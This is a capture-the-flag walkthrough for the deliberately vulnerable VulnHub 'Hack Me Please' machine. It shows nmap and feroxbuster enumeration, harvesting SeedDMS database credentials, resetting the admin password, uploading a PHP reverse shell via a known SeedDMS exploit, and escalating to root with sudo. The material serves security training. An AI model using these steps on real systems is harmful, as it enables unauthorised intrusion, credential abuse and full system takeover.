<img src="./mzxzbmd0.png"
style="width:4.39583in;height:1.21875in" /><img src="./bc0ixfhe.png" style="width:6.27083in;height:2.75in" />

Please Hack Me: 1 Vm:
[<u>https://download.vulnhub.com/hackmeplease/Hack_Me_Please.rar</u>](https://download.vulnhub.com/hackmeplease/Hack_Me_Please.rar)

Difficulty: Easy

Description: An easy box totally made for OSCP. No bruteforce is
required.

Aim: To get root shell

> 1\. Let’s find out our target.
>
> Command:- sudo nmap -sS 192.168.1.0/24.
>
> Use this command to find out service running on different systems in
> your network.
>
> Output:-
>
> Our vulnerable machine is running 2 services.
>
> 2\. Let’s check the application running on port 80:
>
> Feature:- Home, About, Entries, Work, Contract.
>
> 3\. Now Let’s check its source code.

<img src="./afdwgogt.png"
style="width:5.07292in;height:4.13542in" /><img src="./jzjrkzoy.png"
style="width:4.65625in;height:1.04167in" />

> A **ready-made** **portfolio/landing** **page** **template** Built
> using **Bootstrap** **+** **jQuery**
>
> Structured into **5** **sections** **(slides)**
>
> 4\. Now Let’s Look for technologies:

Directory Brute Force:

> 1\. Tool used: feroxbuster.
>
> Command: feroxbuster --url http://192.168.1.48/ -r -v
>
> Found Directories:-

<img src="./pogyj3iq.png"
style="width:5.59375in;height:4.26042in" />

> 2\. Now let’s look which are live : Tool: httpx-toolkit
>
> <img src="./nc4kmhxz.png"
> style="width:5.64583in;height:4.22917in" />Command: httpx2 -l
> directories-url.txt -fc 403,404,409 -nc -dashboard

<img src="./vzehvwxi.png" style="width:6.27083in;height:2.25in" /><img src="./cfdsecfe.png"
style="width:6.27083in;height:2.66667in" /><img src="./ihzqgv2e.png"
style="width:6.27083in;height:0.51042in" />

> 3\. Now let’s see the comments available on each url page source code.
> Tool: custom script.
>
> Available here:
>
> We see a path : /seeddms51x/seeddms-5.1.22/ Now let’s check that
> manually.
>
> It redirect’s to seeddms sign in page.
>
> 4\. Now let’s check if source code is available .
>
> Found site:
> [<u>https://sourceforge.net/p/seeddms/code/ci/master/tree/</u>](https://sourceforge.net/p/seeddms/code/ci/master/tree/)
>
> Now let’s check interesting directories: conf
>
> Found three file template .
>
> Look for interesting file : settings.xml.template
>
> This is a template remove template before using that with target as
> file path. Like this :
> [<u>http://192.168.1.48/seeddms51x/conf/settings.xml</u>](http://192.168.1.48/seeddms51x/conf/settings.xml.template)
>
> Mysql user: seeddms Mysql passwd: seeddms

<img src="./eg5luatj.png"
style="width:6.27083in;height:2.11458in" />

Mysql enumeration:

Command : sudo nmap --script "mysql-\* and not mysql-brute" 192.168.1.48

mysql-info:

\| Protocol: 10

\| Version: 8.0.25-0ubuntu0.20.04.1 mysql-enum:

\| Valid usernames:

\| sysadmin:\<empty\> - Valid credentials \| guest:\<empty\> - Valid
credentials

\| test:\<empty\> - Valid credentials \| user:\<empty\> - Valid
credentials \| web:\<empty\> - Valid credentials

\| webadmin:\<empty\> - Valid credentials

\| administrator:\<empty\> - Valid credentials \| root:\<empty\> - Valid
credentials

\| admin:\<empty\> - Valid credentials

\| netadmin:\<empty\> - Valid credentials

Now let’s check these users and find the user and passwd from above.

It seems that users that we found are only allowed to login from a local
machine and not from a remote host.

Note : commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate

Not valid before: 2021-07-03 Not valid after: 2031-07-01

> ● The server uses an **auto-generated** **SSL** **certificate** ●
> Valid for 10 years
>
> ● Enables encrypted connections.

So command : mysql -h 192.168.1.48 -u seeddms -p --disable-ssl

<img src="./3rwsdrhu.png"
style="width:6.27083in;height:3.79167in" /><img src="./k3s3pbzu.png"
style="width:5.80208in;height:3.1875in" /><img src="./522e1moa.png" style="width:2.64583in;height:2.25in" />

<img src="./vonrzqrt.png"
style="width:6.27083in;height:1.20833in" /><img src="./cquhc2ds.png"
style="width:3.61458in;height:0.53125in" /><img src="./5iq4hdjg.png"
style="width:6.27083in;height:0.86458in" /><img src="./lhdsrxav.png"
style="width:6.27083in;height:1.66667in" /><img src="./rw4dgd52.png"
style="width:3.61458in;height:0.95833in" />

Now let’s change the admin passwd with out md5 hashed passwd. Command :
echo -n hello\| md5sum

Now let’s sign in in seeddms.

Download php reverse-shell :

[<u>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</u>](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Change the ip according to your ip. Let’s start a netcat listener.

Look at exploit here:
[<u>https://www.exploit-db.com/exploits/47022</u>](https://www.exploit-db.com/exploits/47022)

Use this path to load your file :
[<u>example.com/data/1048576/"document_id"/1.php</u>](http://example.com/data/1048576/%22document_id%22/1.php)

Like this:
[<u>http://192.168.1.38/seeddms51x/data/1048576/4/1.php</u>](http://192.168.1.38/seeddms51x/data/1048576/4/1.php)

<img src="./xshx35ft.png"
style="width:6.27083in;height:1.17708in" /><img src="./xfox5wjp.png" style="width:4.5in;height:0.375in" /><img src="./4plxa3kf.png"
style="width:5.98958in;height:1.46875in" /><img src="./ye5qzsmm.png"
style="width:6.27083in;height:1.53125in" /><img src="./tv3rr1r2.png"
style="width:4.34375in;height:1.89583in" />

Got The Connection.

Now create an interactive shell:

Command: python3 -c ‘import pty; pty.spawn(“/bin/bash”)’

Now let’s switch to the user we have user name and passwd: User: Saket

Passwd: Saket@#\$1337

Now let’s check the privilege.

Saket can run any command on the shell. Then we just run this : sudo
/bin/sh

DONE!
